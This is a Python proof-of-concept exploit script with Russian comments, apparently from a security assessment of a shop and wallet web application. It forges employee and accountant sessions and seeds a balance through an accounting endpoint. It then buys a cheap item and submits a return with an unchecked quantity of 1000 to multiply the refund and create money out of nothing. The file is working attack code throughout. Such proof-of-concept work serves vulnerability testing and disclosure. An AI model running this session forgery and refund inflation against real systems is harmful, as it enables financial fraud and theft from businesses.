# -*- coding: utf-8 -*-
"""V-08. Инфляция возврата через управляемый qty.

handlers_shop.go, orderReturn: refund = total * qty, где qty берётся из формы
без проверки. Покупаем дешёвый товар и возвращаем с qty=1000 -> на счёт падает
сумма в 1000 раз больше заказа. Деньги создаются из воздуха.
"""
import re

from wallet_client import Client, parser, banner, ok, fail


def balance_kop(client):
    body = client.get("/")[2].decode("utf-8", "replace")
    m = re.search(r'class="value">([\d\s ]+),(\d\d)\s*₽', body)
    if not m:
        return None
    return int(re.sub(r"\D", "", m.group(1))) * 100 + int(m.group(2))


def main():
    a = parser("Инфляция возврата заказа").parse_args()
    c = Client(a.base)
    c.forge(2, "employee")  # uid 2 = petrova, 220 руб
    # дадим денег на покупку, не трогая логику возврата
    acc = Client(a.base); acc.forge(5, "accountant")
    acc.post_form("/accounting/adjust", {"login": "petrova", "delta_rub": "1000", "reason": "poc-seed"})

    before = balance_kop(c)
    banner(f"баланс до: {before} коп")

    c.post_form("/cart/add", {"product_id": "3"})  # снеки 270 руб
    body = c.post_form("/checkout/quote", {"promo_code": "", "tip_kop": "0", "item_comment": "x"})[2]
    m = re.search(r'name="quote_id"\s+value="(\d+)"', body.decode("utf-8", "replace"))
    _, hdr, _ = c.post_form("/checkout/confirm", {"quote_id": m.group(1)})
    oid = re.search(r"/orders/(\d+)", hdr.get("Location", "")).group(1)
    banner(f"создан заказ #{oid}")

    c.post_form(f"/orders/{oid}/return", {"qty": "1000"})
    after = balance_kop(c)
    banner(f"баланс после возврата qty=1000: {after} коп")
    if after is None or after <= before:
        fail("баланс не вырос")
    banner(f"прирост: {(after - before) / 100:.2f} руб")
    ok("возврат умножен на qty — произвольная эмиссия средств")


if __name__ == "__main__":
    main()
